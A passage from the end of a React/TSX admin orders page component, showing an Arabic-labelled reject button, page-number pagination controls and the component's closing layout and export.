                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <X className="h-4 w-4 ml-2" />
                              )}
                              رفض
                            </Button>
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  );
                })}
              </div>
            )}

            {/* Pagination */}
            {!loading && totalPages > 1 && (
              <div className="mt-8 flex justify-center">
                <Pagination dir="ltr">
                  <PaginationContent>
                    <PaginationItem>
                      <PaginationPrevious 
                        onClick={() => currentPage > 1 && handlePageChange(currentPage - 1)}
                        className={currentPage === 1 ? "pointer-events-none opacity-50" : "cursor-pointer"}
                      />
                    </PaginationItem>
                    
                    {getPageNumbers().map((page, index) => (
                      <PaginationItem key={index}>
                        {page === '...' ? (
                          <PaginationEllipsis />
                        ) : (
                          <PaginationLink
                            onClick={() => handlePageChange(page as number)}
                            isActive={currentPage === page}
                            className="cursor-pointer"
                          >
                            {page}
                          </PaginationLink>
                        )}
                      </PaginationItem>
                    ))}
                    
                    <PaginationItem>
                      <PaginationNext 
                        onClick={() => currentPage < totalPages && handlePageChange(currentPage + 1)}
                        className={currentPage === totalPages ? "pointer-events-none opacity-50" : "cursor-pointer"}
                      />
                    </PaginationItem>
                  </PaginationContent>
                </Pagination>
              </div>
            )}
          </div>
        </main>
      </div>
    </SidebarProvider>
  );
};

export default AdminOrders;
